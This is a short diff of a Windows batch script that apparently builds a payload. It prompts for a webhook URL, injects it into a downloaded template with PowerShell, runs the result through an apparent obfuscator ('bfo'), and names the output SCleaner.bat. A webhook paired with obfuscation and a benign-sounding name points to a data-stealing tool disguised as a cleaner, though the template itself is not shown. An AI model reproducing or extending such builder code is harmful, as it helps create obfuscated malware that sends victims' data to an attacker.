@@ -17,9 +17,7 @@ if not exist isgen2.txt echo Downloading isgen2.txt.. & echo. & powershell -Comm
 if "%webhook%"=="" set /p webhook=Please enter a webhook URL: 
 if exist "%TEMP%\SCleaner.bat" del "%TEMP%\SCleaner.bat"
 type isgen.txt>>"%TEMP%\SCleaner.bat"
-echo.>>"%TEMP%\SCleaner.bat"
-echo set webhook=%webhook%>>"%TEMP%\SCleaner.bat"
-type isgen2.txt>>"%TEMP%\SCleaner.bat"
+powershell -Command "(Get-Content '%TEMP%\SCleaner.bat') -replace 'your_webhook_url_here1', '%webhook%' | Set-Content '%TEMP%\SCleaner.bat'"
 call bfo "%TEMP%\SCleaner.bat" >nul
 del "%TEMP%\SCleaner.bat"
 ren SCleaner___.bat SCleaner.bat >nul
